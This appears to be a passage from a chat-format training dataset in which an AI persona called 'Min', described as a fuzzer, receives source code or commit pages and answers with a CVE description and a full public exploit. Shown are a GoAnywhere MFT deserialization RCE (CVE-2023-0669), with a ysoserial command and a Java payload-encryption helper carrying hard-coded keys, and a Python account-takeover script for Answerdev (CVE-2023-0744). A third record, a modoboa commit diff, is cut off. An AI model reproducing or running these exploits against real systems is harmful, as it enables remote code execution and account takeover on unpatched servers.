parameter which could be properly decrypted as well. Next, step would be the call to com.linoma.license.gen2.BundleWorker.verify(byte[], KeyConfig).\nprivate static byte[] verify(byte[] paramArrayOfByte, KeyConfig paramKeyConfig) throws IOException, ClassNotFoundException, NoSuchAlgorithmException, InvalidKeyException, SignatureException, UnrecoverableKeyException, CertificateException, KeyStoreException {\n  objectInputStream = null;\n  try {\n    String str = \"SHA1withDSA\";\n    if (\"2\".equals(paramKeyConfig.getVersion())) {\n      str = \"SHA512withRSA\";\n    }\n    PublicKey publicKey = getPublicKey(paramKeyConfig);\n    objectInputStream = new ObjectInputStream(new ByteArrayInputStream(paramArrayOfByte));\n    SignedObject signedObject = (SignedObject)objectInputStream.readObject(); // [11]\n    Signature signature = Signature.getInstance(str);\n    boolean bool = signedObject.verify(publicKey, signature);\n\t  // ...\n\nLong story short: [11] calls ObjectInputStream.readObject, the best known sink to insecure deserialization. The one sink mentioned in my notes in 2021.\nBut deserialization doesn’t automatically mean RCE or similar kind of critical vulnerabilities. Some products have heavy hierarchies of well-defined Spartan-like class loaders, basically not giving you any attack vectors. Several SAP products are a really good example for this “issue”.\nLooking to the lib folder containing all the JARs files used by GoAnywhere\nactivation-1.1.1.jar\nagent-commons-3.0.0.jar\napache-mime4j-core-0.7.2.jar\naws-java-sdk-cloudfront-1.12.272.jar\naws-java-sdk-core-1.12.272.jar\naws-java-sdk-kms-1.12.272.jar\naws-java-sdk-s3-1.12.272.jar\naws-java-sdk-sts-1.12.272.jar\nazure-keyvault-core-0.8.0.jar\nazure-storage-5.5.0.jar\nbatik-all-1.15.jar\nbc-fips-1.0.2.3.jar\nbcmail-fips-1.0.4.jar\nbcpg-fips-1.0.7.1.jar\nbcpkix-fips-1.0.7.jar\nbctls-fips-1.0.14.jar\nbsh-2.0b6.jar\nchecker-qual-3.12.0.jar\ncommons-beanutils-1.9.4.jar\ncommons-codec-1.15.jar\ncommons-collections-3.2.2.jar\ncommons-collections4-4.4.jar\ncommons-compress-1.21.jar\ncommons-configuration-1.10.jar\ncommons-dbcp-1.3.jar\ncommons-digester-2.1.jar\ncommons-exec-1.3.jar\ncommons-fileupload-1.4.jar\n...\n\nmakes the security researcher’s heart beat faster. A table of gifts. I’m a fan of the ysoserial gadget CommonsBeanutils1. But we need some custom code to build our final payload first. Remember? The encryption/decryption part.\npublic class CryptorHelper {\n\n\tpublic static void main(String[] args) throws Exception, Exception {\n\t\tfinal byte[] IV = { 65, 69, 83, 47, 67, 66, 67, 47, 80, 75, 67, 83, 53, 80, 97, 100 };\n\n\t\tStandardEncryptionEngine see = new StandardEncryptionEngine(getInitializationValue(), IV, \"AES\",\n\t\t\t\t\"AES/CBC/PKCS5Padding\");\n\n\t\tPath path = Paths.get(\"/home/user/tmp/mspaint.bin\");\n\t\tbyte[] data = Files.readAllBytes(path);\n\n\t\tSystem.out.println(\"[+] Encrypted: \" + new String(Base64.encodeBase64(see.encrypt(data)), \"UTF-8\"));\n\n\t}\n\n\tprivate static byte[] getInitializationValue() throws Exception {\n\t\tbyte[] arrayOfByte1 = { 103, 111, 64, 110, 121, 119, 104, 101, 114, 101, 76, 105, 99, 101, 110, 115, 101, 80,\n\t\t\t\t64, 36, 36, 119, 114, 100 };\n\n\t\tbyte[] arrayOfByte2 = { -19, 45, -32, -73, 65, 123, -7, 85 };\n\t\tchar c1 = '┿';\n\t\tchar c2 = 'Ā';\n\n\t\tSecretKeyFactory secretKeyFactory = SecretKeyFactory.getInstance(\"PBKDF2WithHmacSHA1\");\n\t\tPBEKeySpec pBEKeySpec = new PBEKeySpec((new String(arrayOfByte1, \"UTF-8\")).toCharArray(), arrayOfByte2, c1, c2);\n\t\tSecretKey secretKey = secretKeyFactory.generateSecret(pBEKeySpec);\n\t\treturn secretKey.getEncoded();\n\t}\n}\n\nWe simply have to reuse the information gathered before, namely hard-coded keys and usage of Crypto API parameters. The serialized Java object created before with ysoserial goes into the file /home/user/tmp/mspaint.bin and the final encrypted Base64-encoded payload is printed to standard out.\nFirst things first: java -cp /home/user/MFT/lib/commons-beanutils-1.9.4.jar:./ysoserial-master-SNAPSHOT.jar ysoserial.GeneratePayload CommonsBeanutils1 \"cmd.exe /K mspaint\" > mspaint.bin.\nWhy didn’t I call java -jar ysoserial.jar instead? Because I wanted to make sure that the proper commons-beanutils-X.Y.Z.jar is used, the one provided in GoAnywhere’s lib directory. Class path order takes care of choosing the proper JAR even though another BeanUtils JAR is included in the ysoserial JAR itself. We don’t want to have any issues with mismatches of serialVersionUIDs, do we?\nNow, let’s run the CryptoHelper: [+] Encrypted: Jh88/jqGQWSbZmiCc1DErQhwOhCTLkYmA1yXgf86Ha5HF9IfVuQMLOfBS/fjlP7wTTEg2+Jx9nBDyFUKVTroXpFBt7zN1XDX58VKZCxCXlUD45d4laUUnNuzdyvNLT2b/...... Looks good!\nPoC\nThe final request is built like this\nPOST /goanywhere/lic/accept HTTP/1.1\nHost: localhost:8000\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: de,en-US;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 3821\n\nbundle=Jh88/jqGQWSbZmiCc1DErQhwOhCTLkYmA1yXgf86Ha5HF9IfVuQMLOfBS/fjlP7wTTEg2%2bJx9nBDyFUKVTroXpFBt7zN1XDX58VKZCxCXlUD45d4laUUnNuzdyvNLT2b/gYKBi2%2bny7fc2lOHNgalYV13mQzCTs0EgEUE9AuDUIMcFYx00pv4g4EOgEjeWbAx40rTt....\n\nand sent to our lab machine: RCE.\n\nFrycos Security Diary\n\nFrycos Security Diary\n\n frycos frycos\nBlogging mainly\n\n"}, {"role": "assistant", "content": "descriptionsFortra (formerly, HelpSystems) GoAnywhere MFT suffers from a pre-authentication command injection vulnerability in the License Response Servlet due to deserializing an arbitrary attacker-controlled object. This issue was patched in version 7.1.2.\n\nexploit\n/java/webapps/51339.java\n// Exploit Title: Goanywhere Encryption helper 7.1.1 - Remote Code Execution (RCE)\n// Google Dork:  title:\"GoAnywhere\"\n// Date: 3/26/2023\n// Exploit Author: Youssef Muhammad\n// Vendor Homepage: https://www.goanywhere.com/\n// Software Link:  https://www.dropbox.com/s/j31l8lgvapbopy3/ga7_0_3_linux_x64.sh?dl=0\n// Version:  > 7.1.1 for windows / > 7.0.3 for Linux\n// Tested on: Windows, Linux\n// CVE : CVE-2023-0669\n// This script is needed to encrypt the serialized payload generated by the ysoserial tool in order to achieve Remote Code Execution\n\nimport java.util.Base64;\nimport javax.crypto.Cipher;\nimport java.nio.charset.StandardCharsets;\nimport javax.crypto.SecretKeyFactory;\nimport javax.crypto.spec.PBEKeySpec;\nimport javax.crypto.spec.IvParameterSpec;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\npublic class CVE_2023_0669_helper {\n    static String ALGORITHM = \"AES/CBC/PKCS5Padding\";\n    static byte[] KEY = new byte[30];\n    static byte[] IV = \"AES/CBC/PKCS5Pad\".getBytes(StandardCharsets.UTF_8);\n    public static void main(String[] args) throws Exception {\n        if (args.length != 2) {\n            System.out.println(\"Usage: java CVE_2023_0669_helper <file_path> <version>\");\n            System.exit(1);\n        }\n        String filePath = args[0];\n        String version = args[1];\n        byte[] fileContent = Files.readAllBytes(Paths.get(filePath));\n        String encryptedContent = encrypt(fileContent, version);\n        System.out.println(encryptedContent);\n    }\n    public static String encrypt(byte[] data, String version) throws Exception {\n        Cipher cipher = Cipher.getInstance(ALGORITHM);\n        KEY = (version.equals(\"2\")) ? getInitializationValueV2() : getInitializationValue();\n        SecretKeySpec keySpec = new SecretKeySpec(KEY, \"AES\");\n        IvParameterSpec ivSpec = new IvParameterSpec(IV);\n        cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);\n        byte[] encryptedObject = cipher.doFinal(data);\n        String bundle = Base64.getUrlEncoder().encodeToString(encryptedObject);\n        String v = (version.equals(\"2\")) ? \"$2\" : \"\";\n        bundle += v;\n        return bundle;\n    }\n    private static byte[] getInitializationValue() throws Exception {\n        // Version 1 Encryption\n        String param1 = \"go@nywhereLicenseP@$$wrd\";\n        byte[] param2 = {-19, 45, -32, -73, 65, 123, -7, 85};\n        return SecretKeyFactory.getInstance(\"PBKDF2WithHmacSHA1\").generateSecret(new PBEKeySpec(new String(param1.getBytes(), \"UTF-8\").toCharArray(), param2, 9535, 256)).getEncoded();\n    }\n    private static byte[] getInitializationValueV2() throws Exception {\n        // Version 2 Encryption\n        String param1 = \"pFRgrOMhauusY2ZDShTsqq2oZXKtoW7R\";\n        byte[] param2 = {99, 76, 71, 87, 49, 74, 119, 83, 109, 112, 50, 75, 104, 107, 56, 73};\n        return SecretKeyFactory.getInstance(\"PBKDF2WithHmacSHA1\").generateSecret(new PBEKeySpec(new String(param1.getBytes(), \"UTF-8\").toCharArray(), param2, 3392, 256)).getEncoded();\n    }\n}\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/answerdev/answer/commit/c1fa2b13f6b547b96da60b23350bbe2b29de542d\nfix  RetrievePassWord code · apache/incubator-answer@c1fa2b1 · GitHub\n\nSkip to content\n\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        apache\n \n/\n\nincubator-answer\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    846\n \n          Star\n 11.8k\n  \nCode\n\nIssues\n82\nPull requests\n2\nDiscussions\n\nActions\n\nProjects\n2\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Discussions\n          Actions\n          Projects\n          Security\n          Insights\n\n \n\nCommit\n\nPermalink\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n          fix RetrievePassWord code\n        \n\nBrowse files\nBrowse the repository at this point in the history\nLoading branch information\n\n \naichy126\n    \n  committed\n  Jan 31, 2023\n\n        1 parent\n          \n          00e4f2c\n\ncommit c1fa2b1\n\n      Showing\n      1 changed file\n      with\n      2 additions\n      and\n      2 deletions.\n    \n \nWhitespace\n \nIgnore whitespace\n\n \nSplit\n \nUnified\n \n \n        There are no files selected for viewing\n\n \n\n            4 changes: 2 additions & 2 deletions\n          \n4 \n\ninternal/controller/user_controller.go\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -157,8 +157,8 @@ func (uc *UserController) RetrievePassWord(ctx *gin.Context) {\n\n return\n\n\t}\n\n _, _ = uc.actionService.ActionRecordAdd(ctx, schema.ActionRecordTypeFindPass, ctx.ClientIP())\n\n code, err := uc.userService.RetrievePassWord(ctx, req)\n\n handler.HandleResponse(ctx, err, code)\n\n _, err := uc.userService.RetrievePassWord(ctx, req)\n\n handler.HandleResponse(ctx, err, nil)\n\n}\n\n// UseRePassWord godoc\nExpand Down\n\nToggle all file notes\nToggle all file annotations\n\n    0 comments\n    on commit c1fa2b1\n\n  \n\n    Please\n  sign in to comment.\n\n \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsImproper Access Control in GitHub repository answerdev/answer prior to 1.0.4.\n\nexploit\n/go/webapps/51257.py\n# Exploit Title: Answerdev 1.0.3 - Account Takeover\n# Date: Reported on Jan 24th 2023\n# Exploit Author: Eduardo P챕rez-Malumbres Cervera @blueudp\n# Vendor Homepage: https://answer.dev/\n# Software Link: https://github.com/answerdev/answer\n# Version: 1.0.3\n# Tested on: Ubuntu 22.04 / Debian 11\n# CVE : CVE-2023-0744\n\n\nfrom sys import argv\nimport urllib3\nfrom requests import post\n\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\n\ndef ato(url: list, email: str) -> str:\n    try:\n        return f\"Your Link: {''.join(url)}users/password-reset?code=\" + \\\n               post(f\"{''.join(url)}answer/api/v1/user/password/reset\", json={\"e_mail\": email}, verify=False).json()[\"data\"]\n    except Exception as err:\n        return f\"Cant reach URL: {err}\"\n\n\nif __name__ == \"__main__\":\n    if len(argv) != 3:\n        print(f\"Usage: {argv[0]} https://answer.domain/ myemail@localhost.com\")\n        exit()\n\n    print(ato([argv[1] if argv[1].endswith(\"/\") else argv[1] + \"/\"], str(argv[2])))\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/modoboa/modoboa/commit/47d17ac6643f870719691073956a26e4be0a4806\nMerge pull request #2767 from modoboa/api-throttling · modoboa/modoboa@47d17ac · GitHub\n\nSkip to content\n\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        modoboa\n \n/\n\nmodoboa\n\nPublic\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    385\n \n          Star\n 2.9k\n  \nCode\n\nIssues\n81\nPull requests\n13\nDiscussions\n\nActions\n\nProjects\n4\nWiki\n\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Discussions\n          Actions\n          Projects\n          Wiki\n          Security\n          Insights\n\n \n\nCommit\n\nPermalink\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n          Merge pull request #2767 from modoboa/api-throttling\n        \n\nBrowse files\nBrowse the repository at this point in the history\n\nApi throttling for rest framework\n\nLoading branch information\n\n \ntonioo\n    \n  committed\n  Feb 10, 2023\n        2 parents\n          \n          650e4d0\n           + \n          d0ec656\n\ncommit 47d17ac\n \n Show file tree\n \n Hide file tree\n\n      Showing\n      22 changed files\n      with\n      228 additions\n      and\n      25 deletions.\n    \n \nWhitespace\n \nIgnore whitespace\n\n \nSplit\n \nUnified\n \n\n \n        doc\n      \n\ndoc/upgrade.rst\n\n        upgrade.rst\n      \n        frontend/src\n      \n\nfrontend/src/App.vue\n\n        App.vue\n      \n        api\n      \n\nfrontend/src/api/repository.js\n\n        repository.js\n      \n        views\n      \n\nfrontend/src/views/Login.vue\n\n        Login.vue\n      \n        user\n      \n\nfrontend/src/views/user/PasswordRecoveryChangeForm.vue\n\n        PasswordRecoveryChangeForm.vue\n      \nfrontend/src/views/user/PasswordRecoveryForm.vue\n\n        PasswordRecoveryForm.vue\n      \nfrontend/src/views/user/PasswordRecoverySmsTotpForm.vue\n\n        PasswordRecoverySmsTotpForm.vue\n      \n        modoboa\n      \n\n        admin/api\n      \n\n        v1\n      \n\nmodoboa/admin/api/v1/viewsets.py\n\n        viewsets.py\n      \n        v2\n      \n\nmodoboa/admin/api/v2/tests.py\n\n        tests.py\n      \nmodoboa/admin/api/v2/viewsets.py\n\n        viewsets.py\n      \n        core\n      \n\n        api\n      \n\n        v1\n      \n\nmodoboa/core/api/v1/viewsets.py\n\n        viewsets.py\n      \n        v2\n      \n\nmodoboa/core/api/v2/views.py\n\n        views.py\n      \nmodoboa/core/api/v2/viewsets.py\n\n        viewsets.py\n      \n        commands/templates\n      \n\nmodoboa/core/commands/templates/settings.py.tpl\n\n        settings.py.tpl\n      \n        dnstools/api/v2\n      \n\nmodoboa/dnstools/api/v2/viewsets.py\n\n        viewsets.py\n      \n        lib\n      \n\nmodoboa/lib/throttle.py\n\n        throttle.py\n      \n        limits/api/v1\n      \n\nmodoboa/limits/api/v1/viewsets.py\n\n        viewsets.py\n      \n        maillog/api/v2\n      \n\nmodoboa/maillog/api/v2/viewsets.py\n\n        viewsets.py\n      \n        parameters/api/v2\n      \n\nmodoboa/parameters/api/v2/viewsets.py\n\n        viewsets.py\n      \n        relaydomains/api/v1\n      \n\nmodoboa/relaydomains/api/v1/viewsets.py\n\n        viewsets.py\n      \n        transport/api/v2\n      \n\nmodoboa/transport/api/v2/viewsets.py\n\n        viewsets.py\n      \n        test_project/test_project\n      \n\ntest_project/test_project/settings.py\n\n        settings.py\n      \n\n \n        There are no files selected for viewing\n\n \n\n            33 changes: 32 additions & 1 deletion\n          \n33 \n\ndoc/upgrade.rst\n \n \n  \n \n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\n\nExpand Up\n\n@@ -123,6 +123,7 @@ The following modifications must be applied to the :file:`settings.py` file:\n\n       },\n\n   ]\n\n* Add the following variable::\n\n.. sourcecode:: python\nExpand All\n\n@@ -141,10 +142,40 @@ The following modifications must be applied to the :file:`settings.py` file:\n\n   },\n\nYou now have the possibility to customize the url of the new-admin\n\n* You now have the possibility to customize the url of the new-admin\n\ninterface.  To do so please head up to :ref:`the custom configuration\n\nchapter <customization>` (advanced user).\n\n* Add ``DEFAULT_THROTTLE_RATES`` to ``REST_FRAMEWORK``:\n\n.. sourcecode:: python\n\n   REST_FRAMEWORK = {\n\n      'DEFAULT_THROTTLE_RATES': {\n\n         'user': '300/minute',\n\n         'ddos': '5/second',\n\n         'ddos_lesser': '200/minute',\n\n         'login': '10/minute',\n\n         'password_recovery_request': '12/hour',\n\n         'password_recovery_totp_check': '25/hour',\n\n         'password_recovery_apply': '25/hour'\n\n      },\n\n      'DEFAULT_AUTHENTICATION_CLASSES': (\n\n         'modoboa.core.drf_authentication.JWTAuthenticationWith2FA',\n\n         'rest_framework.authentication.TokenAuthentication',\n\n         'rest_framework.authentication.SessionAuthentication',\n\n      ),\n\n      'DEFAULT_SCHEMA_CLASS': 'drf_spectacular.openapi.AutoSchema',\n\n      'DEFAULT_VERSIONING_CLASS': 'rest_framework.versioning.NamespaceVersioning',\n\n   }\n\n* You can edit the ``DEFAULT_THROTTLE_RATES`` to whatever value suits you.\n\n   - `user` is for every endpoint, it is per user or per ip if not logged.\n\n   - `ddos` is per api endpoint and per user or per ip if not logged. \n\n   - `ddos_lesser` is for per api endpoint and per user or per ip if not logged. This is for api endpoint that are lighter.\n\n   - `login` the number of time an ip can attempt to log. The counter will reset on login success.\n\n   - `password_` is for the recovery, it is divided per step in the recovery process.\n\n2.0.3\n\n=====\nExpand Down\n            8 changes: 5 additions & 3 deletions\n          \n8 \n\nfrontend/src/App.vue\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -60,9 +60,11 @@ export default {\n\n  }),\n\n  methods: {\n\n showNotification (options) {\n\n this.notification = options.msg\n\n this.notificationColor = (options.type) ? options.type : 'success'\n\n this.snackbar = true\n\n if (this.isAuthenticated) {\n\n this.notification = options.msg\n\n this.notificationColor = (options.type) ? options.type : 'success'\n\n this.snackbar = true\n\n      }\n\n    }\n\n  }\n\n}\nExpand Down\n            7 changes: 7 additions & 0 deletions\n          \n7 \n\nfrontend/src/api/repository.js\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -3,8 +3,11 @@ import Cookies from 'js-cookie'\n\nimport router from '../router'\n\nimport store from '../store'\n\nimport { translate } from 'vue-gettext'\n\nimport { bus } from '@/main'\n\nconst _axios = axios.create()\n\nconst { gettext: $gettext } = translate\n\n_axios.interceptors.request.use(\n\n function (config) {\nExpand All\n\n@@ -31,6 +34,10 @@ _axios.interceptors.response.use(\n\n router.push({ name: 'TwoFA' })\n\n return Promise.reject(error)\n\n }\n\n if (error.response.status === 429) {\n\n bus.$emit('notification', { msg: $gettext('You are throttled, please try later.'), type: 'error' })\n\n return Promise.reject(error)\n\n }\n\n if (error.response.status !== 401 || router.currentRoute.path === '/login/') {\n\n return Promise.reject(error)\n\n }\nExpand Down\n            4 changes: 4 additions & 0 deletions\n          \n4 \n\nfrontend/src/views/Login.vue\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -94,6 +94,10 @@ export default {\n\n this.$refs.observer.setErrors({\n\n            password: this.$gettext('Invalid username and/or password')\n\n          })\n\n        } else if (err.response.status === 429) {\n\n this.$refs.observer.setErrors({\n\n            password: this.$gettext('Too many unsuccessful attempts, please try later.')\n\n          })\n\n        }\n\n      })\n\n    }\nExpand Down\n            3 changes: 2 additions & 1 deletion\n          \n3 \n\nfrontend/src/views/user/PasswordRecoveryChangeForm.vue\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -81,7 +81,6 @@ export default {\n\n      } else {\n\n const decodedId = atob(this.$route.params.id)\n\n if (!/^\\d+$/.test(decodedId)) {\n\n console.error('Received ID is invalid')\n\n this.$router.push({ name: 'PasswordRecoveryForm' })\n\n        } else {\n\n this.id = this.$route.params.id\nExpand Down\n\nExpand Up\n\n@@ -119,6 +118,8 @@ export default {\n\n err.response.data.errors.forEach(element => {\n\n            message += this.$gettext(element) + '<br>'\n\n          })\n\n        } else if (err.response.status === 429) {\n\n          message = this.$gettext('Too many unsuccessful attempts, please try later.')\n\n        }\n\n this.password_validation_error = message\n\n      })\nExpand Down\n            4 changes: 4 additions & 0 deletions\n          \n4 \n\nfrontend/src/views/user/PasswordRecoveryForm.vue\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -110,6 +110,10 @@ export default {\n\n          }\n\n        } else if (err.response.status === 503 && err.response.data.type === 'email') {\n\n this.showDialog('Error', err.response.data.reason, true)\n\n        } else if (err.response.status === 429) {\n\n this.$refs.observer.setErrors({\n\n            email: this.$gettext('Too many unsuccessful attempts, please try later.')\n\n          })\n\n        }\n\n      })\n\n    }\nExpand Down\n            6 changes: 5 additions & 1 deletion\n          \n6 \n\nfrontend/src/views/user/PasswordRecoverySmsTotpForm.vue\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -82,13 +82,17 @@ export default {\n\n this.loading = false\n\n if (resp.status === 200) {\n\n this.$refs.observer.setErrors({\n\n password_confirmed: this.$gettext('TOTP resent.')\n\n sms_totp: this.$gettext('TOTP resent.')\n\n          })\n\n        }\n\n      }).catch(err => {\n\n if (err.response.status === 400) {\n\n this.loading = false\n\n this.showErrorDialog(this.$t('User seems wrong, return to login or restart reset the process?'))\n\n        } else if (err.response.status === 429) {\n\n this.$refs.observer.setErrors({\n\n            sms_totp: this.$gettext('Too many unsuccessful attempts, please try later.')\n\n          })\n\n        }\n\n      })\n\n    },\nExpand Down\n            19 changes: 14 additions & 5 deletions\n          \n19 \n\nmodoboa/admin/api/v1/viewsets.py\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -16,6 +16,7 @@\n\nfrom modoboa.core import sms_backends\n\nfrom modoboa.lib import renderers as lib_renderers\n\nfrom modoboa.lib import viewsets as lib_viewsets\n\nfrom modoboa.lib.throttle import GetThrottleViewsetMixin, PasswordResetRequestThrottle\n\nfrom ... import lib, models\n\nfrom . import serializers\nExpand All\n\n@@ -35,7 +36,7 @@\n\n summary=\"Create a new domain\"\n\n    )\n\n)\n\nclass DomainViewSet(lib_viewsets.RevisionModelMixin, viewsets.ModelViewSet):\n\nclass DomainViewSet(GetThrottleViewsetMixin, lib_viewsets.RevisionModelMixin, viewsets.ModelViewSet):\n\n \"\"\"Domain viewset.\"\"\"\n\n permission_classes = [IsAuthenticated, DjangoModelPermissions, ]\nExpand All\n\n@@ -60,7 +61,7 @@ class Meta:\n\n fields = [\"domain\"]\n\nclass DomainAliasViewSet(lib_viewsets.RevisionModelMixin,\n\nclass DomainAliasViewSet(GetThrottleViewsetMixin, lib_viewsets.RevisionModelMixin,\n\n viewsets.ModelViewSet):\n\n \"\"\"ViewSet for DomainAlias.\"\"\"\nExpand All\n\n@@ -80,13 +81,21 @@ def get_renderer_context(self):\n\n return context\n\nclass AccountViewSet(lib_viewsets.RevisionModelMixin, viewsets.ModelViewSet):\n\nclass AccountViewSet(GetThrottleViewsetMixin, lib_viewsets.RevisionModelMixin, viewsets.ModelViewSet):\n\n \"\"\"ViewSet for User/Mailbox.\"\"\"\n\n filter_backends = (filters.SearchFilter, )\n\n permission_classes = [IsAuthenticated, DjangoModelPermissions, ]\n\n search_fields = (\"^first_name\", \"^last_name\", \"^email\")\n\n def get_throttles(self):\n\n throttles = super().get_throttles()\n\n if self.action == \"reset_password\":\n\n throttles.append(PasswordResetRequestThrottle())\n\n return throttles\n\n def get_serializer_class(self):\n\n \"\"\"Return a serializer.\"\"\"\n\n action_dict = {\nExpand Down\n\nExpand Up\n\n@@ -175,7 +184,7 @@ def reset_password(self, request):\n\n return Response(body)\n\nclass AliasViewSet(lib_viewsets.RevisionModelMixin, viewsets.ModelViewSet):\n\nclass AliasViewSet(GetThrottleViewsetMixin, lib_viewsets.RevisionModelMixin, viewsets.ModelViewSet):\n\n \"\"\"\n\n    create:\n\n    Create a new alias instance.\nExpand Down\n\nExpand Up\n\n@@ -207,7 +216,7 @@ class Meta:\n\n fields = [\"mailbox\"]\n\nclass SenderAddressViewSet(lib_viewsets.RevisionModelMixin,\n\nclass 